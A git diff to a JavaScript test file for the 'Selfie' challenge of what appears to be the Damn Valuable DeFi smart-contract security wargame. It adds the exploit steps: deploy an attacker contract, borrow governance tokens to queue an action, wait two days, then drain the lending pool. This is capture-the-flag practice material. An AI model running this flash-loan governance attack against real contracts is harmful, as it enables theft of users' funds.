@@ -5,6 +5,8 @@ const DamnValuableTokenSnapshot = contract.fromArtifact('DamnValuableTokenSnapsh
 const SelfiePool = contract.fromArtifact('SelfiePool');
 const SimpleGovernance = contract.fromArtifact('SimpleGovernance');
 
+const SelfieAttacker = contract.fromArtifact('SelfieAttacker');
+
 const { expect } = require('chai');
 
 describe('[Challenge] Selfie', function () {
@@ -34,6 +36,18 @@ describe('[Challenge] Selfie', function () {
 
     it('Exploit', async function () {
         /** YOUR EXPLOIT GOES HERE */
+
+        /* Deploy attacker contract */
+        this.attContract = await SelfieAttacker.new({ from: attacker });
+
+        /* Run exploit - borrow governance tokens and queue the function call */
+        await this.attContract.attack(this.pool.address, this.token.address, this.governance.address, { from: attacker });
+
+        /* Wait until the queued function call can be executed */
+        await time.increase(time.duration.days(2));
+
+        /* Execute the function call and drain all tokens */
+        await this.attContract.drain({ from: attacker });
     });
 
     after(async function () {
